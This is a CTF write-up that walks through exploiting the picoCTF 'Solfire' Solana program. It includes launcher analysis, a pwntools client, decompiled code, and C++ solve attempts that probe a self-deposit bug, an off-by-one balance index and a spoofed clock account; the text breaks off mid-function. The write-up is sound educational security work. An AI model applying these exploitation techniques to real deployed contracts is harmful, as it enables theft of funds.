---
title: picoCTF 2022 - Solfire - Pwn
tags: pwn
---

This is a CTF Security challenge which involves exploiting a Solana on-chain program.

NOTE: This challenge is now part of the [picoGym practice challenges](https://play.picoctf.org/practice?page=1&search=solfire)

**Points**: 500

**Category**: Binary exploitation (pwn)

**Challenge Author**: [Robert Chen (NotDeGhost)](https://twitter.com/notdeghost?lang=en)

**Description**

> What is debt? A perversion of a promise?
Surely one has to pay one's debts.

**TL;DR Solution**
> Exploit a buffer overflow and incorrectly sized account to trick withdraw into thinking it has more money in it then expected.

## Contents

* [Introduction to Solana](#introduction-to-solana)
* Understanding
    * [Examining the launcher application](#examining-the-launcher-application)
    * [Creating a template to start things off](#creating-a-template-to-start-things-off)
    * [Getting logging going](#getting-logging-going)
    * [Decompiling the solfire binary](#decompiling-the-the-solfire-binary)
    * [Calling solfire from the solve program](#calling-solfire-from-the-solve-program)
* Solve Attempts
    * [Deposit bug](#deposit-bug)
    * [Buffer overflow bug](#buffer-overflow-bug)
    * [Owner check bug](#owner-check-bug)
    * [Account transfer attempt](#account-transfer-attempt)
    * [Creating a new account with no space (The solution)](#create-a-new-account-with-no-space-the-solution)
* [Closing thoughts](#closing-thoughts)

## Introduction to Solana

Before digging into this challenge I had little to no experience with Cryptocurrency security or programming, so spent a bit of time ramping up on how Solana works.

In order to understand this write-up you'll need a basic understanding of some of the terminology, sorry for anyone who has more experience with this I've probably butchered the explanations. 

Solana has accounts which are used to store state, this state could be some binary, an image, or a program, they could also store no state and just be used as a reference address.

These accounts also contain the actual currency in Lamports which is the equivalent of 0.000000001 SOL.

All accounts have an address which is a 256-bit (32-byte) public key often represented in a base-58 encoding, they also have an owner which is the only one allowed to change the data on that account.

An important part of Solana programming is the signing system, which is powered by program derived addresses (PDA), these are addresses which get created with a combination of a public key and a seed.

The seed is used to offset the public key (which is on an elliptic), the offset of the seed might still end up on the same elliptic curve (which means a private key could exist out there for it) so part of finding a PDA with a seed involves adding an additional bump byte to it which would push it off the curve if it did end up on it.

Solana programs are a compiled ELF binary where the instructions are compiled into eBPF, which is a small effective instruction set typically used for writing sandboxed things within the Linux Kernel.

These are typically called on-chain programs because they live on the blockchain, additionally there are native programs, which are special programs inside solana that run on the Solana clusters, such as the system program which can be used to create new accounts, transfer accounts, etc.

Solana programs get executed using instructions, which provide a data and an ordered list of account meta's which it will execute on.

Instructions get executed as part of a transaction when any instruction in a transaction fails then the entire transaction fails and none of the changes it performed get committed.

On top of this when a program is executed Solana will check to see that sum of all Lamports matches and no new Lamports have been created out of no where.

A lot more detailed and accurate information can be found in the [Solana Cookbook](https://solanacookbook.com/)


## Examining the launcher application

Inside the challenge package there is a launcher program which is the main entry point which you connect to, it launches a virtual Solana environment using the [Solana PoC framework](https://github.com/neodyme-labs/solana-poc-framework).

The program accepts for TCP connections on port 8080, the first thing it does is request a length for a new program to be loaded into the environment.

```rust
writeln!(socket, "len: ")?;
reader.read_line(&mut line)?;
let len: usize = line.trim().parse()?;

let mut solve_so = vec![0; len];
reader.read_exact(&mut solve_so)?;
```

Then it loads this program and the `solfire.so`

```rust
let program_pubkey = env.deploy_program("./solfire.so");
let solve_pubkey = env.deploy_program(solve_file.path());
```

The public key for these programs are calculated based on a SHA256 hash of it's contents, for `solfire.so` this will never change, but will keep changing anytime the solve file you input above changes.

After this the user account will be created which is the main account used in this challenge it is the only signing key provided to the call into the solve program, adn is later validated to see if it has enough lamports to determine if the challenge is solved.

With all 3 of these addresses/accounts the addresses will be sent to the connection

```rust
writeln!(socket, "program pubkey: {}", program_pubkey)?;
writeln!(socket, "solve pubkey: {}", solve_pubkey)?;
writeln!(socket, "user pubkey: {}", user.pubkey())?;
```

A program derived address is then created/found with the seed of "vault"

```rust
let (vault, _) = Pubkey::find_program_address(&["vault".as_ref()], &program_pubkey);
```

Now all the relevant accounts have been setup, the user account will be provided with 10 Lamports and the Vault will be provided 1,000,000 Lamports.

```rust
const INIT_BAL: u64 = 10;
const VAULT_BAL: u64 = 1_000_000;
env.execute_as_transaction(
        &[transfer(
            &env.payer().pubkey(),
            &user.pubkey(),
            INIT_BAL,
        ),
        transfer(
            &env.payer().pubkey(),
            &vault,
            VAULT_BAL,
        )
        ],
        &[&env.payer()],
    );
```

Now that all the accounts are setup a new transaction starts to be formed, in order to create this transaction a list of accounts needs to be provided, this is done by providing the number of accounts then the public key and meta data for each account, the meta data indicates if it's writeable or a signer.

```rust
assert!(reader.read_line(&mut line)? != 0);
let accts: usize = line.trim().parse()?;

let mut metas = Vec::<AccountMeta>::new();
for _ in 0..accts {
    line.clear();
    assert!(reader.read_line(&mut line)? != 0);

    let mut it = line.trim().split(' ');

    let meta = it.next().unwrap();
    let pubkey = Pubkey::from_str(it.next().unwrap())?;

    let is_signer = meta.contains('s');
    let is_writable = meta.contains('w');

    if is_writable {
        metas.push(AccountMeta::new(pubkey, is_signer));
    } else {
        metas.push(AccountMeta::new_readonly(pubkey, is_signer));
    }
}
```

The example input for this would be something like this, which sets up an account as writeable and a signer. 

```
ws f15bksYCXxexNSgkBT9nNk16FviVWBSmxCjkRVnTkSQi
```

If you need to provide an account which isn't writeable or a signer then you can also just provide anything for the meta data, for example this would be an account which is only read from

```
q f15bksYCXxexNSgkBT9nNk16FviVWBSmxCjkRVnTkSQi
```

Finally the transaction can be provided some data to work on, which is prefixed with another size.

```rust
assert!(reader.read_line(&mut line)? != 0);
let ix_data_len: usize = line.trim().parse()?;
let mut ix_data = vec![0; ix_data_len];

reader.read_exact(&mut ix_data)?;
```

After all of this setup the solve program we provided get's executed in a transaction.

```
let ix = Instruction::new_with_bytes(
    solve_pubkey,
    &ix_data,
    metas
);

let tx = Transaction::new_signed_with_payer(
    &[ix],
    Some(&user.pubkey()),
    &vec![&user],
    env.get_recent_blockhash(),
);

env.execute_transaction(tx);
```

After all of this the check for the flag occurs, which validates that the user account managed to get additional lamports

```rust
const TARGET_AMT: u64 = 50_000;

let user_bal = env.get_account(user.pubkey()).unwrap().lamports;
writeln!(socket, "user bal: {:?}", user_bal)?;
writeln!(socket, "vault bal: {:?}", env.get_account(vault).unwrap().lamports)?;

if user_bal > TARGET_AMT {
    writeln!(socket, "congrats!")?;
    if let Ok(flag) = env::var("FLAG") {
        writeln!(socket, "flag: {:?}", flag)?;
    } else {
        writeln!(socket, "flag not found, please contact admin")?;
    }
}
```

To summarize we must provide a Solana program which will transfer 50,000 Lamports to the user.

## Creating a template to start things off

As seen from the loader program the first thing we need is a Solana program, in order to this I grabbed the [Solana SDK](https://docs.solana.com/cli/install-solana-cli-tools) and the [Hello world example](https://github.com/solana-labs/example-helloworld).

I used the C example and changed it into a C++ version, primarily because I'm more of a C++ developer and the Rust version binaries appeared to be be fairly big that they created some issues in my test environment.

In order to change the C example into a C++ example simply rename it to the `.c` file to `.cc`

Here is the simplest starting program that I created

```cpp
#include <solana_sdk.h>

// I should have used 'class' to trigger the OOP haters :D
struct Solution
{
	SolAccountInfo accounts_[10];
	SolParameters params = { .ka = accounts_ };

	uint64_t run(const uint8_t * input) 
	{
		sol_log("Solution::run");

		if (!sol_deserialize(input, &params, SOL_ARRAY_SIZE(accounts_))) {
			return ERROR_INVALID_ARGUMENT;
		}

		return SUCCESS;
	}
};

extern uint64_t entrypoint(const uint8_t *input) {
	Solution solution;
	return solution.run(input);
}
```

Now we need a basic script to get up and going with this

```python
from pwn import *

host = args.HOST or 'localhost'
port = int(args.PORT or 8080)
solve_so = './example/example-helloworld-master/dist/program/helloworld.so'

io = connect(host, port)

with open(solve_so, 'rb') as f:
    solve_so_data = f.read()

io.sendlineafter(b'len', str(len(solve_so_data)).encode('ascii'))
io.send(solve_so_data)
print(io.recvuntil(b'program pubkey: ').decode('ascii'),end='')
program_pubkey = io.recvline().strip()
print(program_pubkey.decode('ascii'))
print(io.recvuntil(b'solve pubkey: ').decode('ascii'),end='')
solve_pubkey = io.recvline().strip()
print(solve_pubkey.decode('ascii'))
print(io.recvuntil(b'user pubkey: ').decode('ascii'),end='')
user_pubkey = io.recvline().strip()
print(user_pubkey.decode('ascii'))

accounts = [
    (b'ws', user_pubkey),
    (b'q', program_pubkey),
    (b'q', solve_pubkey),
]

io.sendline(str(len(accounts)).encode('ascii'))
for access, key in accounts:
    io.sendline(access + b' ' + key)

ix_data = b''
io.sendline(str(len(ix_data)).encode('ascii'))
io.send(ix_data)
output = printable(io.recvall()).decode('utf-8')
print(output)
```

Now once running this script you'll probably notice the log generated with `sol_log` isn't included, which is going to be vital for getting anywhere on in this challenge, so the next thing I did was get logging going.

## Getting logging going

The first thing I wanted to add was making the outside caller in the pool output logs for errors raised. (I'm sure there are nicer ways, but I'm no Rust guru)

```rust
use std::panic;
```

```rust
for stream in listener.incoming() {
    let mut stream = stream.unwrap();

    pool.execute(move || {
        let r = panic::catch_unwind(|| {
                match handle_connection(stream.try_clone().unwrap()) {
                    Ok(_) => {}
                    Err(error) => panic!("Failed complete: {:?}", error),
                }
            } );

        match r {
            Ok(_) => writeln!(stream, "Successfully handled connection"),
            Err(error) => writeln!(stream, "Problem handling connection: {:?}", error.downcast::<String>()),
        }.unwrap();
    });
}
```

This makes it easier to pickup parsing and other errors, however the logs inside the transaction are not included in this in order to do those I made use of [gag](https://docs.rs/gag/latest/gag/) and [PrintableTransaction](https://docs.rs/poc-framework/0.1.0/poc_framework/trait.PrintableTransaction.html)

```rust
use poc_framework::{
...
    PrintableTransaction
};
use gag::BufferRedirect;
```

```rust
let mut buf = BufferRedirect::stdout().unwrap();
let txconfirmed = env.execute_transaction(tx);
println!("+==================================================");
txconfirmed.print_named("my transaction");
println!("==================================================");
let mut output = String::new();
buf.read_to_string(&mut output).unwrap();
writeln!(socket, "logs:")?;
writeln!(socket, "{}", output)?;
```

Now all logs should be output to the TCP stream making it super easy to get them while iterating on things.

On top of this, there is also internal Solana logs which can be super helpful, I didn't redirect these to the TCP stream but did increase them to verbose, so I could look them when the program was running if something was really odd.

```rust
let mut env_builder = LocalEnvironment::builder();
let mut env = env_builder.build();

poc_framework::setup_logging(poc_framework::LogLevel::TRACE);
```

Now that logging is all setup now let's take a look at the output

```
program pubkey: 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn
solve pubkey: 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY
user pubkey: 5Qi7CjEJBqpRc5M9LANYMXMagiyjXobwZa2sfhHfDHVX
[+] Receiving all data: Done (2.22KB)
[*] Closed connection to localhost port 8080
vault pubkey: 28Xm4VxYY2wAywq8pNMfYRrhs99aTGEsyLoE4hozDgu6
logs:
+==================================================
EXECUTE my transaction (slot 0)
  Recent Blockhash: GzqNGx9wxh9gfyTjkkdQkV13RbfVBDaC1UXgTnww8HJd
  Signature 0: 2rV3nEMaXcRxXvoqKAVhSwUNnVcSJSUarcpo1vYkfyGJVYT4TeNXFRkPqq3KrxorxPEi4YQ1ry9VyZCDfn2MUa18
  Account 0: srw- 5Qi7CjEJBqpRc5M9LANYMXMagiyjXobwZa2sfhHfDHVX (fee payer)
  Account 1: -rw- 28Xm4VxYY2wAywq8pNMfYRrhs99aTGEsyLoE4hozDgu6
  Account 2: -rw- CpCVBEtjy1uxGifo6UsebVoAceLApxAMaJwwaE57nd2V
  Account 3: -rw- 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdh2
  Account 4: -r-- C1ockAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  Account 5: -r-- 11111111111111111111111111111111
  Account 6: -r-- 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn
  Account 7: -r-x 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY
  Account 8: -r-- BPFLoaderUpgradeab1e11111111111111111111111
  Instruction 0
    Program:   6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY (7)
    Account 0: C1ockAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (4)
    Account 1: 11111111111111111111111111111111 (5)
    Account 2: 5Qi7CjEJBqpRc5M9LANYMXMagiyjXobwZa2sfhHfDHVX (0)
    Account 3: 28Xm4VxYY2wAywq8pNMfYRrhs99aTGEsyLoE4hozDgu6 (1)
    Account 4: 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn (6)
    Account 5: 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY (7)
    Account 6: CpCVBEtjy1uxGifo6UsebVoAceLApxAMaJwwaE57nd2V (2)
    Account 7: BPFLoaderUpgradeab1e11111111111111111111111 (8)
    Account 8: 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdh2 (3)
    Data: [254, 253, 255]
  Status: Ok
    Fee: ◎0
    Account 0 balance: ◎0.00000001
    Account 1 balance: ◎0.001
    Account 2 balance: ◎0
    Account 3 balance: ◎0
    Account 4 balance: ◎0
    Account 5 balance: ◎0.000000001
    Account 6 balance: ◎0.15607104
    Account 7 balance: ◎0.02527872
    Account 8 balance: ◎0.000000001
  Log Messages:
    Program 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY invoke [1]
    Program log: Solution::run
    Program 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY consumed 431 of 200000 compute units
    Program 6shXiHG14jh6tsSvMnPnuAEtpzdAKMT6pskd4mD45vdY success
==================================================

user bal: 10
vault bal: 1000000
Successfully handled connection
```

## Decompiling the the solfire binary

### Getting Ghidra setup to work with `solfire.so`

Ghidra doesn't have built-in support for opening eBPF programs.

I initially used the [eBPF for Ghidra](https://github.com/Nalen98/eBPF-for-Ghidra) when solving the problem and did a bunch of changes to get it working, but while doing this write-up, I discovered the [eBPF Solana](https://github.com/Toizi/eBPF-for-Ghidra) fork that actually has all of the changes needed to support Solana, along with a lot more useful stuff.

### Examining the code

Looking at the disassembly I noticed that the file paths seem to indicate that this is a C example, which means it's probably following a similar pattern to the hello world and other C examples with the deserialize function then calling a main-like function.

So I create the relevant `struct`s from the Solana SDK to get `SolParameters` setup to assume that it is passed into the `solfire` function.

The first thing that I notice within this is that it attempts to get the first account passed and calls `b58enc` which probably means base-58 encode on it's key to get a string representation of the key, and verify that it starts with `C1ock`

Unfortunately Ghidra builds a weird while loop, but this doesn't actually happen in a loop, it's just assumed the return was inside the loop not that it was a condition that broke outside the loop.

```cpp
    if (offs_in_b58_2 <= loop_iterations) break;
    offs_in_clock = 0;
    while (b58_code_ptr[offs_in_clock] == "C1ock"[offs_in_clock]) {
      if ((b58_code_ptr[offs_in_clock] == '\0') ||
         (bVar1 = 3 < offs_in_clock, offs_in_clock = offs_in_clock + 1, bVar1)) {
        if (offs_in_b58_2 <= loop_iterations) goto LBB12_11;
        ...
      }
    }
    b58_code_ptr = b58_code_ptr + 1;
    loop_iterations += 1;
  }
LBB12_11:
  b58_code_ptr = "bad C1ock account";
  uVar4 = 0x11;
LBB12_14:
  sol_log_(b58_code_p  sol_log_(b58_code_p
  return 0x200000000;
}
```

When the `C1ock` account is verified it will then get the first 4 bytes of the input and treat this as an op-code (0 for `handle_create`, 1 for `handle_deposit`, 2 for `handle_withdraw`)

```c
if (input->data_len < 4) {
    sol_panic_("./src/solfire/solfire.c",0x18,0xc5,0);
}
op_choice = (longlong)*(uint *)input->data;
if (op_choice == 0) {
    handle_create(input);
}
else if (op_choice == 1) {
    handle_deposit(input);
}
else {
    if (op_choice != 2) {
        sol_log_("invalid op choice",0x11);
        log_int((longlong)*(int *)input->data,10);
        return 0x200000000;
    }
    handle_withdraw(input);
}
return 0;
```

You can create a `C1ock` account using `solana-keygen`
```sh
solana-keygen grind --starts-with C1ock:1
```

The other option is to fake one
```py
clock_account = b'C1ock'.ljust(len(user_pubkey), b'A')
```

#### **Handle create operation**

The `handle_create` function, this expects 5 accounts

| Account     | Description                       |
| ----------- | --------------------------------- |
| 0           | C1ock account                     |
| 1           | System program                    |
| 2           | New Account (Write, Sign)         |
| 3           | Unused                            |
| 4           | Funding Account (Write, Sign)     |

The data provided for the instruction is in the following format.

```cpp
struct CreateAccountInput
{
	uint32_t opcode = 0; // Set to 0 for handle_create
	uint8_t bump_seed; // Used for signing (so just the bump byte), the seed doesn't actually need to get used, just be valid for the solfire program
};
```

When executed this will call the following system instruction

```rust
CreateAccount {
    lamports: u64, // The initial balance: set to 1
    space: u64,    // The space allocated for the account: 10kb
    owner: Pubkey, // The solfire program key
}
```

#### **Handle deposit instruction**

The `handle_deposit` function, this expects 5 accounts

| Account     | Description                             |
| ----------- | --------------------------------------- |
| 0           | C1ock account                           |
| 1           | System program                          |
| 2           | An account owned by solfire (Write)     |
| 3           | Funding Account (Write, Sign)           |
| 4           | Recipient Account (Write)               |

The data provided for the instruction is in the following format.

```cpp
struct DepositInput
{
    uint32_t opcode = 1; // Set to 1 for handle_deposit
    uint32_t balance_index; // (MAX: 640) An index on the solfire owned account where the deposit will be added to
    uint32_t lamports; // (MIN: 1) The number of lamports to send
};
```

When executed this will call the following system instruction

```rust
Transfer { lamports: u64 }
```

When the transfer is done the balance is adjusted, as mentioned above there is some accounting based on `balance_index` which is an managed by an array on account 2 (The solfire owned account), this is how it's adjusted.

```cpp
struct Balance
{
    uint64_t withdraws; // See the next section
    uint64_t deposits;
};

Balance * balances = (Balances*)accounts[2].data;
DepositInput * input = (DepositInput*)(params.data); 

Balance & balance = balances[input->balance_index];

balance.deposits += input->lamports;
```

#### **Handle withdraw instruction**

The `handle_withdraw` function, this expects 5 accounts

| Account     | Description                             |
| ----------- | --------------------------------------- |
| 0           | C1ock account                           |
| 1           | System program                          |
| 2           | An account owned by solfire (Write)     |
| 3           | Recipient Account (Write, Sign)         |
| 4           | Funding Account (Write)                 |

The data provided for the instruction is in the following format.

```cpp
struct WithdrawInput
{
    uint32_t opcode = 2; // Set to 2 for handle_withdraw
    uint32_t balance_index; // (MAX: 640) An index on the solfire owned account where the withdraw will come from
    uint32_t lamports; // (MIN: 1) The number of lamports to send
    uint8_t vault_bump_seed; // A bump seed used for vault signing
};
```

When executed this will also call the `Transfer` instruction, after the transfer is done the balance is adjusted based on `balance_index`.

```cpp
Balance * balances = (WithdrawInput*)accounts[2].data;
WithdrawInput * input = (DepositInput*)(params.data); 

Balance & balance = balances[input->balance_index];

balance.withdraws += input->lamports;

// Ensure the account had enough balance
if (balance.deposits < balance.withdraws)
{
    sol_panic_("./src/solfire/solfire.c",0x18,175,0);
}
```

## Calling solfire from the solve program

In order to use the solfire program we need another account which we don't already have which can be owned by the solfire program and store balances on.

In order to define this account create a program defined address for the solve account in Python which can be passed around.

We will also need the clock, system account and eventually vault account and it's bump key.

```python
from solana.publickey import PublicKey
```

```python
clock_pubkey = b'C1ock'.ljust(len(user_pubkey), b'A')
system_pubkey = b'11111111111111111111111111111111'

_, solfire_bump_seed = PublicKey.find_program_address([], PublicKey(program_pubkey.decode('ascii')))

balances_pubkey, balances_bump_seed = PublicKey.find_program_address([b"A"], PublicKey(solve_pubkey.decode('ascii')))
balances_pubkey = balances_pubkey.to_base58()

vault_pubkey, vault_bump_seed = PublicKey.find_program_address([b"vault"], PublicKey(program_pubkey.decode('ascii')))
vault_pubkey = vault_pubkey.to_base58()

# The order of these doesn't matter
accounts = [
    (b'q', clock_pubkey),
    (b'q', system_pubkey),
    (b'ws', user_pubkey),
    (b'w', vault_pubkey),
    (b'q', program_pubkey),
    (b'q', solve_pubkey),
    (b'w', balances_pubkey),
]
```

We also need the bump see to be ale to sign for this address from our solve program.

```python
ix_data = p8(solfire_bump_seed) + p8(balances_bump_seed) + p8(vault_bump_seed)
```

Now from inside our solve program we need to get these accounts and bump seeds to start using them.

```cpp
sol_assert(params.ka_num == 7);
sol_assert(params.data_len == 3);
```
```cpp
SolAccountInfo & c1ock_account() { return params.ka[0]; }
SolAccountInfo & system_account() { return params.ka[1]; }
SolAccountInfo & user_account() { return params.ka[2]; }
SolAccountInfo & vault_account() { return params.ka[3]; }
SolAccountInfo & solfire_account() { return params.ka[4]; }
SolAccountInfo & solve_account() { return params.ka[5]; }
SolAccountInfo & balances_account() { return params.ka[6]; }


uint8_t solfire_bump_seed() { return params.data[0]; }
uint8_t balances_bump_seed() { return params.data[1]; }
uint8_t vault_bump_seed() { return params.data[2]; }
```

Finally some functions to start calling the solfire program.

```cpp
void create_account(SolPubkey * balances, SolPubkey * funder)
{
    uint8_t seed_data[] = { 'A', balances_bump_seed() };
    SolSignerSeed seed = {
        .addr = seed_data,
        .len = SOL_ARRAY_SIZE(seed_data),
    };

    const SolSignerSeeds signers_seeds[] = { 
        { &seed, 1 },
    };

    SolAccountMeta meta[] = {
        { .pubkey = c1ock_account().key, .is_writable = 0, .is_signer = 0 },
        { .pubkey = system_account().key, .is_writable = 0, .is_signer = 0 },
        // The account to be created:
        { .pubkey = balances, .is_writable = 1, .is_signer = 1 },
        // This account is unused, using system/null:
        { .pubkey = system_account().key, .is_writable = 0, .is_signer = 0 },
        { .pubkey = funder, .is_writable = 1, .is_signer = 1 },
    };

    CreateAccountInput ix_data { .bump_seed = solfire_bump_seed() };

    SolInstruction instruction = {
        .program_id = solfire_account().key,
        .accounts = meta,
        .account_len = SOL_ARRAY_SIZE(meta),
        .data = (uint8_t*)&ix_data,
        .data_len = sizeof(ix_data),
    };

    sol_invoke_signed(&instruction, params.ka, params.ka_num, signers_seeds, 1);
}

void deposit(SolPubkey * balances, uint32_t lamports, SolPubkey * funder, SolPubkey * recipient, uint32_t balance_index = 0)
{
    SolAccountMeta meta[] = {
        { .pubkey = c1ock_account().key, .is_writable = 0, .is_signer = 0 },
        { .pubkey = system_account().key, .is_writable = 0, .is_signer = 0 },
        { .pubkey = balances, .is_writable = 1, .is_signer = 0 },
        { .pubkey = funder, .is_writable = 1, .is_signer = 1 },
        { .pubkey = recipient, .is_writable = 1, .is_signer = 0 },
    };

    DepositInput ix_data {
        .balance_index = balance_index,
        .lamports = lamports,
    };

    SolInstruction instruction = {
        .program_id = solfire_account().key,
        .accounts = meta,
        .account_len = SOL_ARRAY_SIZE(meta),
        .data = (uint8_t*)&ix_data,
        .data_len = sizeof(ix_data),
    };

    sol_invoke(&instruction, params.ka, params.ka_num);
}

void withdraw(SolPubkey * balances, uint32_t lamports, SolPubkey * recipient, SolPubkey * funder, uint32_t balance_index = 0)
{
    SolAccountMeta meta[] = {
        { .pubkey = c1ock_account().key, .is_writable = 0, .is_signer = 0 },
        { .pubkey = system_account().key, .is_writable = 0, .is_signer = 0 },
        { .pubkey = balances, .is_writable = 1, .is_signer = 0 },
        { .pubkey = recipient, .is_writable = 1, .is_signer = 1 },
        { .pubkey = funder, .is_writable = 1, .is_signer = 0 },
    };

    WithdrawInput ix_data {
        .balance_index = balance_index,
        .lamports = lamports,
        .vault_bump_seed = vault_bump_seed()
    };

    SolInstruction instruction = {
        .program_id = solfire_account().key,
        .accounts = meta,
        .account_len = SOL_ARRAY_SIZE(meta),
        .data = (uint8_t*)&ix_data,
        .data_len = sizeof(ix_data),
    };

    sol_invoke(&instruction, params.ka, params.ka_num);
}
```

Then finally this can be used to work with the potentially expected naive non-exploited workflow, creating an account depositing 5 lamports and withdrawing them again.

```cpp
uint32_t lamports = 5;
create_account(balances_account().key, user_account().key);
deposit(balances_account().key, lamports, user_account().key, vault_account().key);
withdraw(balances_account().key, lamports, user_account().key, vault_account().key);
```


## Deposit bug

The first bug that I spotted was that `handle_deposit` doesn't validate that the accounts specified aren't the same account or that the solana account is in anyway associated with the funder and recipient.

So this means that we could specify the user account with it's balance that we already start with as signed to transfer money to itself, until the solfire owned account gets it's deposit amount up to 50k amount.

So let's slightly change the approach we are doing

```cpp
uint32_t target = 50'000;
create_account(balances_account().key, user_account().key);
while (*user_account().lamports < target)
{
    deposit(balances_account().key, *user_account().lamports, user_account().key, user_account().key);
}
withdraw(balances_account().key, target, user_account().key, vault_account().key);
```

Unfortunately when attempting to this we exceed the maximum number of instructions

```
....truncated
Program log: Solfire start
Program log: handle_deposit
Program 11111111111111111111111111111111 invoke [3]
Program 11111111111111111111111111111111 success
Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn consumed 44303 of 62667 compute units
Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn success
Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn invoke [2]
Program log: Solfire start
Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn consumed 17282 of 17282 compute units
Program failed to complete: exceeded maximum number of instructions allowed (17282) at instruction #204
Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn failed: Program failed to complete
Program EGuk7HfhxRAHWGsBw2sayNKY8tTPgCsWkGto57krYTj9 consumed 200000 of 200000 compute units
Program EGuk7HfhxRAHWGsBw2sayNKY8tTPgCsWkGto57krYTj9 failed: Program failed to complete
```

I did try attempting to increase perform a call to the compute budget program to get more, but this was unsuccessful.

## Buffer overflow bug

The index into the balances account the bounds check for it within `handle_withdraw` and `handle_deposit` is the following

```c
if (640 < *(ulonglong *)&in_data->entry_index) {
    sol_panic_("./src/solfire/solfire.c",0x18,95,0);
}
```

However the buffer size allocated is 10240 bytes, and the `Balance` structure that it's indexing is 16 bytes, so while it can have a maximum of 640 entries, it's checking the index which index 640 is actually the 641st entry, as indexes count from 0.

So let's try doing a withdrawal on that value, just hope that what it run's into has something which can be treated as `Balance::deposits` with a large enough value.

```cpp
uint32_t lamports = 1;
uint32_t balance_index = 640;
create_account(balances_account().key, user_account().key);
withdraw(balances_account().key, lamports, user_account().key, vault_account().key, balance_index);
```

Unfortunately this didn't work
```
Program log: handle_withdraw
Program 11111111111111111111111111111111 invoke [3]
Program 11111111111111111111111111111111 success
Program 96e3EUQXXb9M5NHU9Vbn4CMfC577ko8dWnRpQKrwDdjn consumed 44353 of 153440 compute units
Program failed to complete: BPF program Panicked in ./src/solfire/solfire.c at 175:0
```

Unfortunate, however it's worth looking at how this deserializes, to understand what that data is inside [`sol_deserialize`](https://github.com/solana-labs/solana/blob/04c0c608a36ea9ebacf6cb96a221ed895fd02cb0/sdk/bpf/c/inc/sol/deserialize.h#L98-L102)

```cpp
#define MAX_PERMITTED_DATA_INCREASE (1024 * 10)
```

```cpp
// account data
params->ka[i].data_len = *(uint64_t *) input;
input += sizeof(uint64_t);
params->ka[i].data = (uint8_t *) input;
input += params->ka[i].data_len;
input += MAX_PERMITTED_DATA_INCREASE;
```

So it looks like after the data there is always another unused 10kb, we can look a little further how this from the serialization side in [`serialize_parameters_aligned`](https://github.com/solana-labs/solana/blob/ddd9d5a5a54f89f69561adf4814d64162f0b5212/programs/bpf_loader/src/serialization.rs#L279-L283).

```rust
v.resize(
    MAX_PERMITTED_DATA_INCREASE
        + (v.write_index() as *const u8).align_offset(BPF_ALIGN_OF_U128),
    0,
)
```

So it seems like this is not really useable, it's just a bunch of 0's which won't really work well as our balance.

## Owner check bug

UPDATE: Thanks to Voltara for pointing out this was not actually a bug, just my poor reading of the code, it's still checking all bytes, the `+ 2` because of the early out checks before.

Looking at the owner checks within deposit and withdraw, it seems like it's only looking at every second byte

```c
  in_program_id = input->program_id;
  in_account_2 = in_accounts[2].owner;
  if (*(longlong *)in_account_2->x == *(longlong *)in_program_id->x) {
                    /* Check in_accounts[2].owner == input->program_id */
    uVar2 = 0;
    if (*(longlong *)(in_account_2->x + 1) == *(longlong *)(in_program_id->x + 1)) {
      uVar2 = 0;
      do {
        if (uVar2 == 30) goto LBB10_15;
        lVar3 = uVar2 + 2; // <==  Increment by 2 bytes (UPDATE: This is wrong it's +2 because of early-out checks)
        lVar4 = uVar2 + 2;
        uVar2 += 1;
      } while (*(longlong *)(in_account_2->x + lVar3) == *(longlong *)(in_program_id->x + lVar4));
    }
    if (30 < uVar2) goto LBB10_15;
  }
  sol_panic_("./src/solfire/solfire.c",0x18,68,0);
LBB10_15:
```

The first thing I looked at with this, if there is away to make the binary which we provide match this the public key except for one byte, I noticed that the public key always seemed to be different when building, so I hoped it might have been part of the build system, but unfortunately it seemed to be [SHA-256 hash of the program](https://github.com/neodyme-labs/solana-poc-framework/blob/2f275b2f608986265105acc16fb8a2ed12b22612/src/lib.rs#L288-L292).

The second idea that I had for this was to see if I could load from within the program using [BPF loader again with a new binary](https://docs.solana.com/developing/runtime-facilities/programs#bpf-loader) which matches this ID.

The first thing that I need to do for this was adding the BPF loader account

```python
bpfloader_pubkey = b'BPFLoaderUpgradeab1e11111111111111111111111'

fake_solfire_pubkey = PublicKey(program_pubkey.decode('ascii'))
fake_solfire_pubkey._key = bytes( fake_solfire_pubkey._key[:-1] + bytes( ( 1, ) ) )
fake_solfire_pubkey = fake_solfire_pubkey.to_base58()

accounts = [
    ...
    (b'q', bpfloader_pubkey),
    (b'w', fake_solfire_pubkey),
]
```

```cpp
SolAccountInfo & bpfloader_account() { return params.ka[7]; }
SolAccountInfo & fake_solfire_account() { return params.ka[8]; }
```

Now that we have the accounts added that we want to work with, we need a function that will be issue the [InitializeBuffer](https://github.com/solana-labs/solana/blob/a89f180145fdc746378cb7c0077bb3478ae972a1/sdk/program/src/loader_upgradeable_instruction.rs#L21) instruction.

```cpp
void initialize_bpf_buffer(SolPubkey * balances, SolPubkey * funder)
{
    SolAccountMeta meta[] = {
        { .pubkey = fake_solfire_account().key, .is_writable = 1, .is_signer = 0 },
        { .pubkey = solve_account().key, .is_writable = 0, .is_signer = 0 },
    };

    SolInstruction instruction = {
        .program_id = bpfloader_account().key,
        .accounts = meta,
        .account_len = SOL_ARRAY_SIZE(meta),
        .data = nullptr,
        .data_len = 0,
    };

